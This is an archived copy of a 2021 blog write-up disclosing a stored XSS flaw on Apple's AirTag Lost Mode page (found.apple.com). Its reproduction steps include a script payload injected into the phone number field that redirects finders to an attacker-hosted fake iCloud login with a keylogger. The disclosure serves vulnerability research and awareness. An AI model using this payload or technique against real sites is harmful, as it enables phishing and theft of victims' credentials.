---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-28_zero-day-hijacking-icloud-credentials-with-apple-airtags-stored-xss.md
original_filename: 2021-09-28_zero-day-hijacking-icloud-credentials-with-apple-airtags-stored-xss.md
title: 'Zero-Day: Hijacking iCloud Credentials with Apple Airtags (Stored XSS)'
category: documents
detected_topics:
- xss
- command-injection
- otp
- clickjacking
- mobile-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- otp
- clickjacking
- mobile-security
- supply-chain
language: en
raw_sha256: ea1677d38a8f5cb5d6ef3b762948d73d13cbae6f65fb8906a78ac75586173754
text_sha256: da085677be9c6f01528f6a89fe46df96149b97133d5da63cbed9c36ded40b524
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Zero-Day: Hijacking iCloud Credentials with Apple Airtags (Stored XSS)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-28_zero-day-hijacking-icloud-credentials-with-apple-airtags-stored-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, clickjacking, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `ea1677d38a8f5cb5d6ef3b762948d73d13cbae6f65fb8906a78ac75586173754`
- Text SHA256: `da085677be9c6f01528f6a89fe46df96149b97133d5da63cbed9c36ded40b524`


## Content

---
title: "Zero-Day: Hijacking iCloud Credentials with Apple Airtags (Stored XSS)"
url: "https://medium.com/@bobbyrsec/zero-day-hijacking-icloud-credentials-with-apple-airtags-stored-xss-6997da43a216"
authors: ["Bobby Rauch / Bobbyr"]
programs: ["Apple"]
bugs: ["Stored XSS"]
publication_date: "2021-09-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3279
scraped_via: "browseros"
---

# Zero-Day: Hijacking iCloud Credentials with Apple Airtags (Stored XSS)

Zero-Day: Hijacking iCloud Credentials with Apple Airtags (Stored XSS)
Bobbyr
Follow
2 min read
·
Sep 28, 2021

301

2

Press enter or click to view image in full size
Photo by Daniel Romero on Unsplash

Apple’s “Lost Mode” allows a user to mark their Airtag as missing if they have misplaced it. This generates a unique https://found.apple.com page, which contains the Airtag’s serial number, and the phone number and personal message of the Airtag owner. If any iPhone or Android user happens to discover a missing Airtag, they can scan it (through NFC) with their device, which will open up the Airtag’s unique https://found.apple.com page on their device.

Press enter or click to view image in full size
Screenshot by Jason Cipriani/CNET

An attacker can carry out Stored XSS on this https://found.apple.com page, by injecting a malicious payload into the Airtag “Lost Mode” phone number field. A victim will believe they are being asked to sign into iCloud so they can get in contact with the owner of the Airtag, when in fact, the attacker has redirected them to a credential hijacking page. Other XSS exploits can be carried out as well like session token hijacking, clickjacking, and more. An attacker can create weaponized Airtags, and leave them around, victimizing innocent people who are simply trying to help a person find their lost Airtag.

Reproduction Steps to create a weaponized Airtag:

An attacker sets their Airtag into lost mode.

2. An attacker intercepts this request, and injects this malicious payload into the phone number field:

<script>window.location=’https://10.0.1.137:8000/indexer.html’;var a = ‘’;</script>

Get Bobbyr’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This XSS code above will redirect a victim to the attacker’s fake iCloud page, which has a keylogger installed to capture their credentials.

3. A victim then discovers the lost Airtag. They open up their Find My app, and scan the Airtag.

4. This opens up the generated https://found.apple.com page. The victim is immediately redirected to the malicious attacker page, which is a direct clone of one of the iCloud.com login pages.

5. The victim enters their iCloud credentials, which are immediately exfiltrated to the attacker’s server.

The above walkthrough outlines only one example of the dangers of Stored XSS. There are countless ways an attacker could victimize an end user who discovers a lost Airtag. Since Airtags were recently released, most users would be unaware that accessing the https://found.apple.com page doesn’t require authentication at all. The https://found.apple.com link can also be used as a phishing link, and shared via a desktop/laptop, without the need for a mobile device to scan the Airtag. Further injection attacks could occur through the Find My App, which is used to scan third-party devices that support “Lost Mode” as part of Apple’s Find My network.
